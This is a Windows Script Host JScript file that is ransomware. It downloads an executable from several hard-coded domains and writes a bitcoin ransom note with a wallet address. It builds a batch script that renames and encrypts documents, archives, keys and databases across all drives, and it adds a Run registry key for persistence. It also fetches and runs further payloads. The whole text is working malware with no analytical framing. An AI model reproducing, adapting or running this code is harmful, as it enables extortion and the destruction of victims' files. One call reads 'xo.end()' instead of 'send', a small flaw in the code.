var id = "LRAf9RSu-l5rAk8FM7MZAj05YpDtxEyEuY72K46WGdFbZP20XuLJwoYHSJnJB47wIa9baToAFno_";
var ad = "1A8nxYR1FNMyjn71RTgmwugHB9Y44p7Akg";
var bc = "0.44834";
var ld = 0;
var cq = String.fromCharCode(34);
var cs = String.fromCharCode(92);
var ll = "puntogel.com pme.com.vn www.staubsaugrobotern.com felicavet.hu www.tattoogreece.gr".split(" ");
var ws = WScript.CreateObject("WScript.Shell");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + cs + "822843";
var xo = WScript.CreateObject("MSXML2.XMLHTTP");
var xa = WScript.CreateObject("ADODB.Stream");
var fo = WScript.CreateObject("Scripting.FileSystemObject");

if (!fo.FileExists(fn + ".txt")) {
    for (var i = ld; i < ll.length; i++) {
        var dn = 0;
        try {
            xo.open("GET", "http://" + ll[i] + "/counter/?ad=" + ad + "&dc=283385", false);
            xo.send();
            if (xo.status == 200) {
                xa.open();
                xa.type = 1;
                xa.write(xo.responseBody);
                if (xa.size > 1000) {
                    dn = 1;
                    xa.position = 0;
                    xa.saveToFile(fn + ".exe", 2);
                };
                xa.close();
            };
            if (dn == 1) {
                ld = i;
                break;
            };
        } catch (er) {};
    };
    if (fo.FileExists(fn + ".exe")) {
        fp = fo.CreateTextFile(fn + ".txt", true);
        fp.WriteLine("ATTENTION!");
        fp.WriteLine("");
        fp.WriteLine("All your documents, photos, databases and other important personal files");
        fp.WriteLine("were encrypted using strong RSA-1024 algorithm with a unique key.");
        fp.WriteLine("To restore your files you have to pay " + bc + " BTC (bitcoins).");
        fp.WriteLine("Please follow this manual:");
        fp.WriteLine("");
        fp.WriteLine("1. Create Bitcoin wallet here:");
        fp.WriteLine("");
        fp.WriteLine("      https://blockchain.info/wallet/new");
        fp.WriteLine("");
        fp.WriteLine("2. Buy " + bc + " BTC with cash, using search here:");
        fp.WriteLine("");
        fp.WriteLine("      https://localbitcoins.com/buy_bitcoins");
        fp.WriteLine("");
        fp.WriteLine("3. Send " + bc + " BTC to this Bitcoin address:");
        fp.WriteLine("");
        fp.WriteLine("      " + ad);
        fp.WriteLine("");
        fp.WriteLine("4. Open one of the following links in your browser to download decryptor:");
        fp.WriteLine("");
        for (var i = 0; i < ll.length; i++) {
            fp.WriteLine("      http://" + ll[i] + "/counter/?ad=" + ad);
        };
        fp.WriteLine("");
        fp.WriteLine("5. Run decryptor to restore your files.");
        fp.WriteLine("");
        fp.WriteLine("PLEASE REMEMBER:");
        fp.WriteLine("");
        fp.WriteLine("      - If you do not pay in 3 days YOU LOOSE ALL YOUR FILES.");
        fp.WriteLine("      - Nobody can help you except us.");
        fp.WriteLine("      - It`s useless to reinstall Windows, update antivirus software, etc.");
        fp.WriteLine("      - Your files can be decrypted only after you make payment.");
        fp.WriteLine("      - You can find this manual on your desktop (DECRYPT.txt).");
        fp.Close();
        fp = fo.CreateTextFile(fn + ".cmd", true);
        for (var i = 67; i <= 90; i++) {
            fp.WriteLine("dir /B " + cq + String.fromCharCode(i) + ":" + cs + cq + " && for /r " + cq + String.fromCharCode(i) + ":" + cs + cq + " %%i in (*.zip *.rar *.7z *.tar *.gz *.xls *.xlsx *.doc *.docx *.pdf *.rtf *.ppt *.pptx *.sxi *.odm *.odt *.mpp *.ssh *.pub *.gpg *.pgp *.kdb *.kdbx *.als *.aup *.cpr *.npr *.cpp *.bas *.asm *.cs *.php *.pas *.vb *.vcproj *.vbproj *.mdb *.accdb *.mdf *.odb *.wdb *.csv *.tsv *.psd *.eps *.cdr *.cpt *.indd *.dwg *.max *.skp *.scad *.cad *.3ds *.blend *.lwo *.lws *.mb *.slddrw *.sldasm *.sldprt *.u3d *.jpg *.tiff *.tif *.raw *.avi *.mpg *.mp4 *.m4v *.mpeg *.mpe *.wmf *.wmv *.veg *.vdi *.vmdk *.vhd *.dsk) do (REN " + cq + "%%i" + cq + " " + cq + "%%~nxi.crypted" + cq + " & call " + fn + ".exe " + cq + "%%i.crypted" + cq + ")");
        };
        fp.WriteLine("REG ADD " + cq + "HKCU" + cs + "SOFTWARE" + cs + "Microsoft" + cs + "Windows" + cs + "CurrentVersion" + cs + "Run" + cq + " /V " + cq + "Crypted" + cq + " /t REG_SZ /F /D " + cq + fn + ".txt" + cq);
        fp.WriteLine("REG ADD " + cq + "HKCR" + cs + ".crypted" + cq + " /ve /t REG_SZ /F /D " + cq + "Crypted" + cq);
        fp.WriteLine("REG ADD " + cq + "HKCR" + cs + "Crypted" + cs + "shell" + cs + "open" + cs + "command" + cq + " /ve /t REG_SZ /F /D " + cq + "notepad.exe " + cs + cq + fn + ".txt" + cs + cq + cq);
        fp.WriteLine("copy /y " + cq + fn + ".txt" + cq + " " + cq + "%AppData%" + cs + "Desktop" + cs + "DECRYPT.txt" + cq);
        fp.WriteLine("copy /y " + cq + fn + ".txt" + cq + " " + cq + "%UserProfile%" + cs + "Desktop" + cs + "DECRYPT.txt" + cq);
        fp.WriteLine("copy /y " + cq + fn + ".txt" + cq + " " + cq + fn + ".exe" + cq);
        fp.WriteLine("del " + cq + fn + ".exe" + cq);
        fp.WriteLine("del " + cq + fn + ".cmd" + cq + " & notepad.exe " + cq + fn + ".txt" + cq);
        fp.Close();
        ws.Run(fn + ".cmd", 0, 0);
    };
    for (var n = 1; n <= 2; n++) {
        for (var i = ld; i < ll.length; i++) {
            var dn = 0;
            try {
                xo.open("GET", "http://" + ll[i] + "/counter/?id=" + id + "&rnd=297188" + n, false);
                xo.end();
                if (xo.status == 200) {
                    xa.open();
                    xa.type = 1;
                    xa.write(xo.responseBody);
                    if (xa.size > 1000) {
                        dn = 1;
                        xa.position = 0;
                        xa.saveToFile(fn + n + ".exe", 2);
                        try {
                            ws.Run(fn + n + ".exe", 1, 0);
                        } catch (er) {};
                    };
                    xa.close();
                };
                if (dn == 1) {
                    ld = i;
                    break;
                };
            } catch (er) {};
        };
    };
};
